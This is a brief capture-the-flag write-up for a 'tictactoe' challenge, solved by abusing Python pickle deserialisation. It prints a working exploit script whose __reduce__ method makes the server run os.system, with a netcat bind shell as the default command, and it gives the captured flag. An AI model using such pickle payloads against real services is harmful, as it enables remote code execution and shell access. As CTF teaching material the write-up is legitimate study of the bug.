# tictactoe

## Challenge Summary

The challenge was based on the python deserialisation bug. THis challenge was very similar to a challenge fromTamuCTF from the previous year involving he cpickle module instead of pickle which is used in the challenge here.

The challenge allowed us to play the tictactoe gane and win 133713371337 times to get the flag in the straightforward way but our goal is to somehow trick the load progress function to fetch the flag from the pickle.dumps()'

```python
import Pickle
import sys
import base64

DEFAULT_COMMAND = "netcat -c '/bin/bash -i' -l -p 4444"
COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

print base64.b64encode(Pickle.dumps(PickleRce()))

```
We passed `cat flag.txt` as commandline argument to this python script which generates the base64 encoded pickle dump for ourinput which the server reads and executes in our challenge.

The base64 dump we get is sent to the sever and we get the flag!!

flag: `gigem{d0esnt_looK_lik3_5t4rs_t0_M3}`
## Resources
https://medium.com/hackstreetboys/tamuctf-2019-pwn-write-up-4-6-of-6-174e41a4a9ca
